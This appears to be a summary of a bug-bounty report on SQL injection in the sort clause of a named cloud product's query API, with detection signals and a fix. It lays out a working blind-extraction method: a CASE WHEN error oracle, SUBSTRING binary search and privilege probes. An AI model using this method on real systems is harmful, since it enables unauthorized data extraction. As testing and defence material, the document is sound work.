SOURCE: operator report corpus 2026-11-14 — Magentrix Cloud / Opirus v2 REST query (the `q=… ORDER BY …` endpoint; 13-token blacklist).
ROUTE: operator handover (in-session).
STATUS: reported-reproduced on the tenant (TRUE control 503 / FALSE control 200; `DB_NAME()` → `magentrix_BugBounty` on `DBSRVSBX01`; `IS_ROLEMEMBER('db_owner')=1` → 503; `IS_SRVROLEMEMBER('sysadmin')`/`SYSTEM_USER LIKE 'sa%'` → 200 = honest negative boundaries; full blind-extraction script shipped with the report); NOT re-run by this pass.
CLASS: SQL injection through an unvalidated ORDER BY / sort clause (CWE-89) with a type-conversion error oracle.
CORE METHOD (as the report states it):
  1. Establish the oracle with ONE query text and two tails, so nothing else varies: `SELECT COUNT(Id), Name FROM Account GROUP BY Name ORDER BY Name` (baseline 200, alphabetical) vs `… ORDER BY CASE WHEN (<cond>) THEN Name ELSE COUNT(Id) END` → 503 when the condition is TRUE (NVARCHAR sorted as INT = conversion failure), 200 when FALSE (sorts the INT aggregate).
  2. Confirm the injection point: the sort key is only checked against a blacklist/AST of known fields, so anything that is not a known field is passed through verbatim; only a semicolon is blocked (no stacked queries) — write is therefore limited, read is total.
  3. Extract any scalar char-by-char with binary search — `SUBSTRING(<expr>, k, 1) <= '<mid>'` (32..126) — and measure length first (`LEN(expr) > N`).
  4. Probe privilege boundaries as separate predicates (`IS_ROLEMEMBER('db_owner')`, `IS_SRVROLEMEMBER('sysadmin')`) and record the NEGATIVES too (the report's honesty section) — the boundary is part of the finding.
  5. Note the enabler: `options` (take/skip) plus a client-authored query language means a low-privilege READONLY seat reaches the tenant DB directly.
DETECTION SIGNAL: an endpoint accepting a sort/order/`ORDER BY`/`sortBy` field name (especially with an aggregate/`GROUP BY` query or an ORM that only validates "known field"); a "13-token blacklist" style control (blocklist thinking = grammar not enforced); HTTP 500/503 on ONE boolean variant of an otherwise identical request (conversion/type errors are the loudest oracle); status codes, not bodies, differing.
CHAIN: lowest-privilege authenticated seat → sort-clause injection → arbitrary SQL expressions via the error oracle → `DB_NAME()`/`@@VERSION`/role membership → table dumps and PII (the report stops at metadata deliberately); with any write-capable sink the same defect is integrity loss.
TRANSFERABLE TEST: for every sort/order parameter: (1) send a KNOWN field (control); (2) send a NON-field expression (`CASE WHEN (<cond>) THEN <textcol> ELSE <intcol> END`) inside the same query — for a TRUE and a FALSE variant; (3) treat the STATUS/error differential as the boolean, then binary-search `SUBSTRING(expr,k,1) <= '<mid>'` for extraction, length first; (4) probe `IS_ROLEMEMBER`/`CURRENT_USER`/`DB_NAME()` to size the impact honestly, and record the negative probes as the boundary. Rule: **a sort clause is SQL text — whitelist the key enum, and expect the oracle in the error/status layer when the body is silent.**
DEDUPE/DELTA: `ORDER BY CASE WHEN` 0 · `IS_ROLEMEMBER` 0 · `DB_NAME` 0 · `SUBSTRING(` 0 across the three targets; the corpus owns `ORDER BY`/time-based blind SQLi (§7.8 NASA) and boolean-blind binary search (§7.9) — NEW atoms: (a) the ORDER BY clause reaching SQL only when the field is UNKNOWN **and** the query carries an aggregate, (b) the T-SQL TYPE-UNIFICATION conversion error as the oracle, (c) the same-session privilege probes as the impact boundary. FRESHNESS: 2026-11.
HONESTY: not reproduced this pass; the report ships the oracle log and extraction script.

---

